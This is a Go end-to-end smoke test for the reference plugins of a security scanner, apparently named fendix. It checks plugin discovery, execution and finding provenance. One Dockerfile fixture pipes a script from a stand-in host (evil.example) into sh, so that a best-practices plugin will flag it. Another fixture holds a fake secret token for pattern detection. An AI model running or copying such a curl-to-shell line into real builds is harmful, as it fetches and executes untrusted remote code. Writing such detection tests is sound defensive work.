//go:build e2e

// refplugins_test.go — TASK-131 plugin smoke test for CI.
//
// Wires each reference plugin under examples/plugins/ into a temporary
// .fendix/plugins/ root, exercises it against a deterministic fixture
// that is guaranteed to trigger findings, and asserts:
//
//   - Discovery: the plugin shows up in the orchestrator's plugin pass
//   - Execution: the plugin's entrypoint runs without crashing
//   - Findings: at least N findings of the expected shape land in the
//     scan report with the engine-attached `fendix-plugin:<name>` provenance
//   - Provenance: every reference plugin's findings carry the correct
//     `fendix-plugin:<name>` tag in their references array
//
// Catches wire-contract regressions: anything that breaks
// orchestrator.runPlugins, the NDJSON terminator parsing, the
// finding-validation pass, or the provenance attachment will fail this
// test before a plugin author files an issue.
//
// Runtime requirements (each plugin is gated on its own subtest by a
// t.Skip if the required runtime is absent — this test still passes on
// CI runners that lack a particular language interpreter):
//
//   - custom-secret-pattern       → python3
//   - custom-blackbox-check       → python3
//   - custom-semgrep-pack         → bash + jq (+ semgrep, optional)
//   - license-header-check        → node
//   - dockerfile-best-practices   → ruby
package e2e

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// referencePluginRoot returns the absolute path to examples/plugins/
// in the repo tree.
func referencePluginRoot(t *testing.T) string {
	t.Helper()
	return filepath.Join(repoRoot(t), "examples", "plugins")
}

// installPlugin copies one reference plugin from examples/plugins/<name>
// into <scanRoot>/.fendix/plugins/<name>/. Returns the destination path.
// Uses cp -R rather than ln -s: symlinked plugin directories are skipped
// during discovery (F-H2), and cp -R matches what users in real installs
// do anyway.
func installPlugin(t *testing.T, scanRoot, name string) string {
	t.Helper()
	src := filepath.Join(referencePluginRoot(t), name)
	if _, err := os.Stat(src); err != nil {
		t.Fatalf("reference plugin %s not found at %s: %v", name, src, err)
	}
	pluginsRoot := filepath.Join(scanRoot, ".fendix", "plugins")
	if err := os.MkdirAll(pluginsRoot, 0o755); err != nil {
		t.Fatalf("mkdir plugins root: %v", err)
	}
	dst := filepath.Join(pluginsRoot, name)
	cmd := exec.Command("cp", "-R", src, dst)
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("cp -R %s %s: %v\n%s", src, dst, err, out)
	}
	return dst
}

// runtimeAvailable checks if a runtime binary is on PATH; subtests
// that require it skip cleanly rather than failing on a CI runner
// that doesn't have e.g. ruby installed.
func runtimeAvailable(t *testing.T, name string) bool {
	t.Helper()
	_, err := exec.LookPath(name)
	return err == nil
}

// runScanAndDecode runs `fendix scan` with the given args and decodes
// the resulting JSON report. Returns the parsed report or fails the test.
func runScanAndDecode(t *testing.T, scanArgs []string) map[string]interface{} {
	t.Helper()
	bin := fendixBinary(t)
	outFile := filepath.Join(t.TempDir(), "report.json")
	// Reference plugins are installed under <scanRoot>/.fendix/plugins/,
	// which is the repo-local root. Repo-local discovery is opt-in
	// (F-H2), so the smoke test must explicitly enable it — exactly as a
	// trusted first-party scan would.
	args := append([]string{"scan", "--format", "json", "--output", outFile, "--allow-repo-local-plugins"}, scanArgs...)
	cmd := exec.Command(bin, args...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		// Non-zero exits aren't always failures — --fail-on can trigger
		// exit 1 with valid output. Only fatal if we can't read the report.
		if _, statErr := os.Stat(outFile); statErr != nil {
			t.Fatalf("scan failed and no report produced: %v\n%s", err, out)
		}
	}
	data, err := os.ReadFile(outFile)
	if err != nil {
		t.Fatalf("read report: %v", err)
	}
	var report map[string]interface{}
	if err := json.Unmarshal(data, &report); err != nil {
		t.Fatalf("decode report: %v\n%s", err, data)
	}
	return report
}

// findingsByProvenance filters the report's findings array down to
// those carrying the given `fendix-plugin:<name>` reference tag.
func findingsByProvenance(t *testing.T, report map[string]interface{}, pluginName string) []map[string]interface{} {
	t.Helper()
	tag := "fendix-plugin:" + pluginName
	raw, ok := report["findings"].([]interface{})
	if !ok {
		return nil
	}
	out := []map[string]interface{}{}
	for _, r := range raw {
		f, ok := r.(map[string]interface{})
		if !ok {
			continue
		}
		refs, ok := f["references"].([]interface{})
		if !ok {
			continue
		}
		for _, ref := range refs {
			if s, ok := ref.(string); ok && s == tag {
				out = append(out, f)
				break
			}
		}
	}
	return out
}

// TestRefPlugins_SmokeTest is the umbrella smoke test for every
// reference plugin under examples/plugins/. Each plugin is a subtest
// so a regression in one doesn't mask another.
func TestRefPlugins_SmokeTest(t *testing.T) {
	t.Run("license-header-check", testLicenseHeaderCheckPlugin)
	t.Run("dockerfile-best-practices", testDockerfileBestPracticesPlugin)
	t.Run("custom-secret-pattern", testCustomSecretPatternPlugin)
	t.Run("custom-blackbox-check", testCustomBlackboxCheckPlugin)
	t.Run("custom-semgrep-pack", testCustomSemgrepPackPlugin)
}

// ---------------------------------------------------------------------------
// license-header-check (Node, TASK-129)
// ---------------------------------------------------------------------------

func testLicenseHeaderCheckPlugin(t *testing.T) {
	if !runtimeAvailable(t, "node") {
		t.Skip("node not installed; skipping license-header-check plugin smoke test")
	}
	scanRoot := t.TempDir()
	installPlugin(t, scanRoot, "license-header-check")

	// Fixture: 3 source files; 2 missing the SPDX header, 1 has it.
	codeDir := filepath.Join(scanRoot, "code")
	if err := os.MkdirAll(codeDir, 0o755); err != nil {
		t.Fatalf("mkdir code: %v", err)
	}
	mustWrite(t, filepath.Join(codeDir, "missing1.js"), "const x = 1;\n")
	mustWrite(t, filepath.Join(codeDir, "missing2.py"), "def foo(): return 42\n")
	mustWrite(t, filepath.Join(codeDir, "has-header.js"), "// SPDX-License-Identifier: MIT\nconst y = 2;\n")

	withCwd(t, scanRoot, func() {
		report := runScanAndDecode(t, []string{"--code", "./code"})
		findings := findingsByProvenance(t, report, "license-header-check")
		if len(findings) < 1 {
			t.Fatalf("expected ≥1 license-header-check finding, got %d (total report findings=%v)",
				len(findings), report["total"])
		}
		f := findings[0]
		title, _ := f["title"].(string)
		if !strings.Contains(title, "SPDX") {
			t.Errorf("finding title doesn't mention SPDX: %q", title)
		}
		category, _ := f["category"].(string)
		if category != "compliance" {
			t.Errorf("category = %q; want compliance", category)
		}
	})
}

// ---------------------------------------------------------------------------
// dockerfile-best-practices (Ruby, TASK-129)
// ---------------------------------------------------------------------------

func testDockerfileBestPracticesPlugin(t *testing.T) {
	if !runtimeAvailable(t, "ruby") {
		t.Skip("ruby not installed; skipping dockerfile-best-practices plugin smoke test")
	}
	scanRoot := t.TempDir()
	installPlugin(t, scanRoot, "dockerfile-best-practices")

	codeDir := filepath.Join(scanRoot, "code")
	if err := os.MkdirAll(codeDir, 0o755); err != nil {
		t.Fatalf("mkdir code: %v", err)
	}
	// Trigger 5 distinct findings: :latest, curl|sh, ADD url, no USER, no HEALTHCHECK.
	mustWrite(t, filepath.Join(codeDir, "Dockerfile"), `FROM alpine:latest
RUN curl https://evil.example/install.sh | sh
ADD https://example.com/x.tar.gz /opt/x.tar.gz
COPY app /app
CMD ["/app"]
`)

	withCwd(t, scanRoot, func() {
		report := runScanAndDecode(t, []string{"--code", "./code"})
		findings := findingsByProvenance(t, report, "dockerfile-best-practices")
		if len(findings) < 3 {
			// We expect 5 distinct findings, but after dedup against any
			// engine-side overlap the floor is 3. Below that something
			// is structurally wrong.
			t.Fatalf("expected ≥3 dockerfile-best-practices findings, got %d", len(findings))
		}
		// At least one MEDIUM-severity finding should fire (root-by-default or curl|sh).
		hasMedium := false
		for _, f := range findings {
			if sev, _ := f["severity"].(string); sev == "MEDIUM" {
				hasMedium = true
				break
			}
		}
		if !hasMedium {
			t.Errorf("expected at least one MEDIUM dockerfile finding; got: %v", findings)
		}
	})
}

// ---------------------------------------------------------------------------
// custom-secret-pattern (Python, original TASK-113 reference)
// ---------------------------------------------------------------------------

func testCustomSecretPatternPlugin(t *testing.T) {
	if !runtimeAvailable(t, "python3") {
		t.Skip("python3 not installed; skipping custom-secret-pattern plugin smoke test")
	}
	scanRoot := t.TempDir()
	installPlugin(t, scanRoot, "custom-secret-pattern")

	codeDir := filepath.Join(scanRoot, "code")
	if err := os.MkdirAll(codeDir, 0o755); err != nil {
		t.Fatalf("mkdir code: %v", err)
	}
	// The reference plugin's regex looks for `acme-secret-` followed by 24 hex chars.
	mustWrite(t, filepath.Join(codeDir, "config.py"),
		`INTERNAL_TOKEN = "acme-secret-1234567890abcdef12345678"`)

	withCwd(t, scanRoot, func() {
		report := runScanAndDecode(t, []string{"--code", "./code"})
		findings := findingsByProvenance(t, report, "custom-secret-pattern")
		if len(findings) < 1 {
			t.Fatalf("expected ≥1 custom-secret-pattern finding, got %d", len(findings))
		}
		sev, _ := findings[0]["severity"].(string)
		if sev != "CRITICAL" {
			t.Errorf("severity = %q; want CRITICAL", sev)
		}
	})
}

// ---------------------------------------------------------------------------
// custom-blackbox-check (Python, original TASK-113 reference)
// ---------------------------------------------------------------------------

func testCustomBlackboxCheckPlugin(t *testing.T) {
	if !runtimeAvailable(t, "python3") {
		t.Skip("python3 not installed; skipping custom-blackbox-check plugin smoke test")
	}
	scanRoot := t.TempDir()
	installPlugin(t, scanRoot, "custom-blackbox-check")

	// httptest server that deliberately omits the compliance header.
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write([]byte("ok"))
	}))
	t.Cleanup(srv.Close)

	wordlist := tinyWordlist(t)

	withCwd(t, scanRoot, func() {
		report := runScanAndDecode(t, []string{
			"--url", srv.URL,
			"--wordlist", wordlist,
			"--max-duration", "10s",
		})
		findings := findingsByProvenance(t, report, "custom-blackbox-check")
		if len(findings) < 1 {
			t.Fatalf("expected ≥1 custom-blackbox-check finding, got %d", len(findings))
		}
	})
}

// ---------------------------------------------------------------------------
// custom-semgrep-pack (Bash + jq, original TASK-113 reference)
// ---------------------------------------------------------------------------

func testCustomSemgrepPackPlugin(t *testing.T) {
	if !runtimeAvailable(t, "bash") || !runtimeAvailable(t, "jq") {
		t.Skip("bash or jq not installed; skipping custom-semgrep-pack plugin smoke test")
	}
	// semgrep is itself optional — the plugin handles its absence
	// gracefully by emitting a done message with no findings. We only
	// assert the plugin runs without erroring; finding count depends
	// on whether semgrep is installed on the test runner.
	scanRoot := t.TempDir()
	installPlugin(t, scanRoot, "custom-semgrep-pack")
	codeDir := filepath.Join(scanRoot, "code")
	if err := os.MkdirAll(codeDir, 0o755); err != nil {
		t.Fatalf("mkdir code: %v", err)
	}
	mustWrite(t, filepath.Join(codeDir, "x.py"), "x = 1\n")

	withCwd(t, scanRoot, func() {
		// Just verify the scan completes — don't assert finding count.
		// The plugin's graceful absence of semgrep is itself the test.
		_ = runScanAndDecode(t, []string{"--code", "./code"})
	})
}

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

// mustWrite is a t.Fatal-on-error os.WriteFile wrapper.
func mustWrite(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("write %s: %v", path, err)
	}
}

// withCwd runs fn with the process cwd temporarily set to dir, restoring
// the original cwd afterwards. Plugin discovery uses the scan's cwd as
// its first search root (.fendix/plugins/), so the test has to chdir
// into its temp dir before invoking fendix.
func withCwd(t *testing.T, dir string, fn func()) {
	t.Helper()
	orig, err := os.Getwd()
	if err != nil {
		t.Fatalf("getwd: %v", err)
	}
	if err := os.Chdir(dir); err != nil {
		t.Fatalf("chdir: %v", err)
	}
	defer func() {
		if err := os.Chdir(orig); err != nil {
			t.Errorf("restore cwd: %v", err)
		}
	}()
	fn()
}
